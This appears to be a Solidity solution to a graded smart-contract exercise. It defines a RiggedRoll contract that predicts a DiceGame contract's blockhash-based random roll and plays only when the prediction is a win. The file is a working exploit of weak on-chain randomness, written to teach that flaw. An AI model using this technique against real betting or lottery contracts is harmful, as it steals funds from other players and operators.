pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdraw(address payable _to, uint256 _amount) public onlyOwner {
        require(_amount <= address(this).balance, "Not enough balance");
        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() public payable {
        require(address(this).balance >= 0.002 ether, "Not enough balance to roll");
        
        // Get current nonce from DiceGame
        uint256 nonce = diceGame.nonce();
        
        // Predict the outcome using the same logic as DiceGame
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
        uint256 roll = uint256(hash) % 16;
        
        console.log("Predicted roll:", roll);
        
        // Only roll if we will win (roll <= 5)
        require(roll <= 5, "Prediction shows we will lose - not rolling!");
        
        // Call rollTheDice with the required minimum amount
        diceGame.rollTheDice{value: 0.002 ether}();
    }

    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {
        console.log("Received", msg.value, "from", msg.sender);
    }
}
